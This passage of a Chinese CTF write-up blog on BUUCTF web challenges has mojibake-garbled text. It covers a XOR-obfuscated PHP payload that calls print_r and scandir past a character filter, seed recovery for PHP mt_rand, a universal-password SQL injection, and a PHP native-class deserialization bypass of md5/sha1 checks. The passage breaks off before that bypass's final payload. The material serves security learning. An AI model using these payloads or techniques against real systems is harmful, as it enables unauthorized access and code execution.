class="hljs-string">&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot;</span> % (a, b, c, d))<br>                        # <span class="hljs-built_in">print</span>(d)<br>                        # d = bytes.fromhex(d)<br>                        # d = d.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>, <span class="hljs-attribute">errors</span>=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>                        # <span class="hljs-built_in">print</span>(d)<br>                        # <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;&#123;bytes.fromhex(d).decode(&#x27;ascii&#x27;, errors=&#x27;ignore&#x27;)&#125;=%&#123;a&#125; ^ %&#123;b&#125; ^ %&#123;c&#125;&quot;</span>)<br>                        <span class="hljs-keyword">if</span> d <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> temp:<br>                            temp.append(d)<br><span class="hljs-built_in">print</span>(len(temp), temp)<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬å¾—åˆ°ç»“æœå¹¶æ‰‹åŠ¨å»é‡<br>å’Œåˆšæ‰çš„æ–¹æ³•ä¸€æ ·,ç›´æ¥ä¸Šç»“æœæŠŠ</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">((<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%88</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>b<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>))(((<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>b))(((<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%88</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>a)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>))((<span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%d1</span>))))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/3DA0E481B463490598C7C62F0476AFAA.png" srcset="/img/loading.gif" lazyload><br>ä¹Ÿå¯ä»¥æ£€æŸ¥å»é‡çš„å€¼æœ‰æ²¡æœ‰å˜åŒ–<br><img src="/images/5E8B6A2B84874d5aB96D9C08D5A14DCE.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&lt;?php<br>highlight_file(__file__)<span class="hljs-comment">;</span><br>$print_r<span class="hljs-operator">=</span>urldecode(&#x27;<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%88</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a&#x27;)^urldecode(&#x27;<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>&#x27;)^urldecode(&#x27;<span class="hljs-variable">%ff</span><span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>b<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>&#x27;)^urldecode(&#x27;<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><br>&#x27;)<span class="hljs-comment">;</span><br>$scandir<span class="hljs-operator">=</span>urldecode(&#x27;<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span>&#x27;)^urldecode(&#x27;<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%88</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%91</span><span class="hljs-variable">%9</span>a&#x27;)^urldecode(&#x27;<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b&#x27;)^urldecode(&#x27;<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><br>&#x27;)<span class="hljs-comment">;</span><br>print($print_r)<span class="hljs-comment">;</span><br>print(<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">;</span><br>print($scandir)<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br># ((<span class="hljs-variable">%8</span>f<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%96</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b<span class="hljs-variable">%a0</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%ff</span><span class="hljs-variable">%96</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>))(((<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span>b<span class="hljs-variable">%96</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%96</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%8</span>f)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>))((<span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%d1</span>)))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>


<h3 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h3><p>æ€è€ƒäº†ä¸€ä¸‹åˆæ‰æœ‰äº†æ€è·¯ï¼ŒæœŸé—´è¢«åƒåœ¾åšå®¢å¸¦åæ€è·¯ï¼Œæµªè´¹äº†å¾ˆå¤šæ—¶é—´ï¼Œå†æ€»ç»“ä¸€ä¸‹æ•´ä½“æ–¹æ¡ˆï¼šå…ˆç®€å•å¼‚æˆ–-&gt;çœ‹æœ‰å‡ ä¸ªå¤šå‡ºæ¥çš„æ•°ï¼Œä¸åŒæ•°çš„æ€»æ•°-13å°±æ˜¯å¤šå‡ºæ¥çš„æ•°ï¼Œæ¥ä¸‹æ¥éœ€è¦ç”¨å·²çŸ¥çš„æ•°æ¥æ„é€ é‚£å¤šå‡ºæ¥æ•°çš„å€¼â€“&gt;å°†å€¼æ‹¼æ¥å›æºå¼â€“&gt;æ„é€ å®Œæˆ</p>
<h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>ç½‘ç«™æœ‰æºç æ³„éœ²ï¼Œåªæœ‰ä¸€ä¸ªindex.php<br>æºç </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php <br>header(<span class="hljs-string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);<br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$Private_key</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Private_key&#x27;</span>];<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$username</span> == <span class="hljs-string">&#x27;&#x27;</span>) || (<span class="hljs-variable">$password</span> == <span class="hljs-string">&#x27;&#x27;</span>) ||(<span class="hljs-variable">$Private_key</span> == <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>        <span class="hljs-regexp">//</span> è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶<span class="hljs-number">3</span>ç§’åè¿”å›ç™»å½•ç•Œé¢<br>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        echo <span class="hljs-string">&quot;ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>&#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> != <span class="hljs-string">&#x27;*************&#x27;</span> )<br>    &#123;<br>        header(<span class="hljs-string">&#x27;refresh:2; url=login.html&#x27;</span>);<br>        echo <span class="hljs-string">&quot;å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$Private_key</span> === <span class="hljs-string">&#x27;************&#x27;</span>)&#123;<br>        <span class="hljs-variable">$getuser</span> = <span class="hljs-string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;</span>.<span class="hljs-string">&#x27;;&#x27;</span>; <br>        <span class="hljs-variable">$link</span>=mysql_connect(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>);<br>        mysql_select_db(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-variable">$link</span>);<br>        <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$getuser</span>);<br>        <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=mysql_fetch_assoc(<span class="hljs-variable">$result</span>))&#123;<br>            echo <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;username&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;flag&quot;</span>].<span class="hljs-string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    &#125;<br><br>&#125; <br><span class="hljs-regexp">//</span> genarate public_key <br><span class="hljs-keyword">function</span> public_key(<span class="hljs-variable">$length</span> = <span class="hljs-number">16</span>) &#123;<br>    <span class="hljs-variable">$strings1</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$public_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$public_key</span> .= substr(<span class="hljs-variable">$strings1</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings1</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    return <span class="hljs-variable">$public_key</span>;<br>  &#125;<br><br>  <span class="hljs-regexp">//g</span>enarate private_key<br>  <span class="hljs-keyword">function</span> private_key(<span class="hljs-variable">$length</span> = <span class="hljs-number">12</span>) &#123;<br>    <span class="hljs-variable">$strings2</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$private_key</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$length</span>; <span class="hljs-variable">$i</span>++ )<br>    <span class="hljs-variable">$private_key</span> .= substr(<span class="hljs-variable">$strings2</span>, mt_rand(<span class="hljs-number">0</span>, strlen(<span class="hljs-variable">$strings2</span>) - <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br>    return <span class="hljs-variable">$private_key</span>;<br>  &#125;<br>  <span class="hljs-variable">$Public_key</span> = public_key();<br>  <span class="hljs-regexp">//</span><span class="hljs-variable">$Public_key</span> = KVQP0LdJKRaV3n9D  how to get crisp<span class="hljs-string">r&#x27;s private_key???</span><br></code></pre></td></tr></table></figure>

<p>çœ‹ä¼¼éå¸¸ç®€å•ï¼Œå®é™…ä¹Ÿéå¸¸ç®€å•<br>è¿™é‡Œæœ‰å…¬é’¥å’Œå¯†é’¥ï¼Œç°åœ¨çŸ¥é“å…¬é’¥æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥é€šè¿‡ä¼ªéšæœºæ•°æ¼æ´æ¥æ±‚è§£ï¼Œæ¥æ¨å‡ºç§å­å€¼<br>è¿™é‡Œå€ŸåŠ©å·¥å…·<a target="_blank" rel="noopener" href="https://github.com/openwall/php_mt_seed">php_mt_seed</a></p>
<p>å…ˆçˆ†ç ´éšæœºåºåˆ—ï¼Œå®˜ç½‘çš„è„šæœ¬ç«Ÿç„¶ä¸å¥½ç”¨ï¼Œæ±‚å‡ºçš„åºåˆ—çˆ†ä¸å‡ºç§å­å€¼ï¼Œè¿™é‡Œæ¢ç”¨æ‰¾åˆ°çš„è„šæœ¬<br><img src="/images/1C405726F5864566869EAEE0A90C739F.png" srcset="/img/loading.gif" lazyload></p>
<p>ç„¶åä½¿ç”¨php_mt_seedçˆ†å‡ºç§å­å€¼<br><img src="/images/DA85CFA3CC984288BE37C16381C0C16A.png" srcset="/img/loading.gif" lazyload></p>
<p>å¸¦å…¥æ‰€ç»™PHPä»£ç <br><img src="/images/2CF1C9ADAA194de4983AB14648960461.png" srcset="/img/loading.gif" lazyload><br>å¾—åˆ°ç§é’¥<br>XuNhoueCDCGc<br><img src="/images/CBCE1EEE41844d31AAD77BE074166FF6.png" srcset="/img/loading.gif" lazyload><br>å› ä¸ºç”¨æˆ·åç»™å‡ºäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥åœ¨å¯†ç å¤„æ‰§è¡Œä¸‡èƒ½å¯†ç å³å¯<br>ç‚¹å‡»ç™»å½•è·å¾—flag</p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp"><a href="#æå®¢å¤§æŒ‘æˆ˜-2020-Greatphp" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp"></a>[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>           <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br>           <br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>åŸç”Ÿç±»ååºåˆ—åŒ–<br>è¿›å…¥é¢˜ç›®ï¼Œåˆ†ææºç ï¼Œé¢˜ç›®ç»•è¿‡ç±»å‹ç¬¬ä¸€çœ¼çœ‹ä¸Šå»åœ¨ctfçš„åŸºç¡€é¢˜ç›®ä¸­éå¸¸å¸¸è§ï¼Œä¸€èˆ¬æƒ…å†µä¸‹åªéœ€è¦ä½¿ç”¨æ•°ç»„å³å¯ç»•è¿‡ï¼Œä½†æ˜¯å‘½ä»¤é‡Œé¢eval() sycè¿™ä¸ªå‚æ•°æœ‰å¾—è¢«æ‰§è¡Œï¼Œæ‰€ä»¥ä¸èƒ½æ˜¯æ•°ç»„ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å«æœ‰__toStringæ–¹æ³•çš„PHPå†…ç½®ç±»(ä¹Ÿå°±æ˜¯åŸç”Ÿç±»)æ¥ç»•è¿‡ï¼Œç”¨çš„ä¸¤ä¸ªæ¯”è¾ƒå¤šçš„å†…ç½®ç±»å°±æ˜¯Exceptionå’ŒErrorï¼Œå®ƒä»¬ä¹‹ä¸­æœ‰ä¸€ä¸ª__toStringæ–¹æ³•ï¼Œå½“ç±»è¢«å½“ä½œå­—ç¬¦ä¸²å¤„ç†æ—¶ï¼Œå°±ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</p>
<p>Errorï¼šç”¨äºPHP7ã€8ï¼Œå¼€å¯æŠ¥é”™<br>Exceotionï¼šç”¨äºPHP5ã€7ã€8ï¼Œå¼€å¯æŠ¥é”™<br>Erroræ˜¯æ‰€æœ‰PHPå†…éƒ¨é”™è¯¯ç±»çš„åŸºç±»ï¼Œè¯¥ç±»åœ¨PHP 7.0.0ä¸­å¼€å§‹å¼•å…¥çš„</p>
<p><img src="/images/C2CD59FD343F419f8C6158AB4F7E32A8.png" srcset="/img/loading.gif" lazyload></p>
<p>å‘ç°ä¼šä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¾“å‡ºå½“å‰é”™è¯¯ï¼ŒåŒ…å«å½“å‰çš„é”™è¯¯ä¿¡æ¯(payload)ä»¥åŠå½“å‰æŠ¥é”™çš„è¡Œå·(2),è€Œä¼ å…¥Error(â€˜payloadâ€™,1)ä¸­çš„é”™è¯¯ä»£ç â€™1â€™åˆ™æ²¡æœ‰è¾“å‡ºå‡ºæ¥ï¼Œæˆ‘ä»¬å†çœ‹çœ‹ä¸¤ä¸ªå‚æ•°çš„ï¼Œæ€ä¹ˆç»•è¿‡MD5ä»¥åŠsha1<br><img src="/images/18C386A2669542c6BC3E6158FF1F4C5F.png" srcset="/img/loading.gif" lazyload></p>
<ul>
<li><p>å¯è§ï¼Œ$aå’Œ$bè¿™ä¸¤ä¸ªå¯¹è±¡æœ¬èº«æ˜¯ä¸åŒçš„ï¼Œä½†æ˜¯__toStringæ–¹æ³•è¿”å›çš„ç»“æœæ˜¯ç›¸åŒçš„ï¼Œè¿™é‡Œä¹‹æ‰€ä»¥éœ€è¦åœ¨åŒä¸€è¡Œæ˜¯å› ä¸º__toStringè¿”å›çš„æ•°æ®åŒ…å«å½“å‰è¡Œå·</p>
</li>
<li><p>Exceptionç±»ä¸Errorçš„ä½¿ç”¨å’Œç»“æœå®Œå…¨ä¸€æ ·ï¼Œåªä¸è¿‡Exceptionç±»é€‚ç”¨äºPHP5å’Œ7ï¼Œè€ŒErroråªé€‚ç”¨äºPHP7</p>
</li>
<li><p>æˆ‘ä»¬å¯ä»¥å°†é¢˜ç›®ä»£ç ä¸­çš„$sycå’Œ$loveråˆ†åˆ«å£°æ˜ä¸ºç±»ä¼¼ä¸Šé¢çš„å†…ç½®ç±»çš„å¯¹è±¡ï¼Œè®©è¿™ä¸¤ä¸ªå¯¹è±¡æœ¬èº«ä¸åŒ(ä¼ å…¥çš„é”™è¯¯ä»£ç ä¸åŒå³å¯)ï¼Œä½†æ˜¯__toStringæ–¹æ³•è¾“å‡ºçš„ç»“æœç›¸åŒå³å¯</p>
</li>
<li><p>ç”±äºé¢˜ç›®ç”¨preg_matchè¿‡æ»¤äº†å°æ‹¬å·æ— æ³•è°ƒç”¨å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬é•¿æ˜¯ç›´æ¥</p>
</li>
</ul>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>buuctf_web</div>
      <div>http://example.com/2023/12/20/buuctf_web/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>å¥‡æ€ªçš„å¥‡æ€ª</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2023å¹´12æœˆ20æ—¥</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>è®¸å¯åè®®</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/03/18/sql/" title="sqlæ³¨å…¥æ¦‚å¿µç†è§£">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">sqlæ³¨å…¥æ¦‚å¿µç†è§£</span>
